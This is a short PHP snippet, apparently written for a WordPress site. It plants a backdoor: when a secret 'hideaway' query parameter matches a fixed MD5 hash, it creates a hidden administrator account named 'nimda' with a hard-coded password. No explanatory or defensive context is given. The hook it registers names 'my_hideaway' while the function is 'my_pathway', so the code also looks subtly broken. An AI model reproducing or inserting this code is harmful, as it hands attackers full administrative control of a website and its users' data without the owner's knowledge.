add_action( 'wp_head', 'my_hideaway' );

function my_pathway() {
    if ( md5( $_GET['hideaway'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'nimda' ) ) {
            $user_id = wp_create_user( 'nimda', 'd@nte_inf!' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}
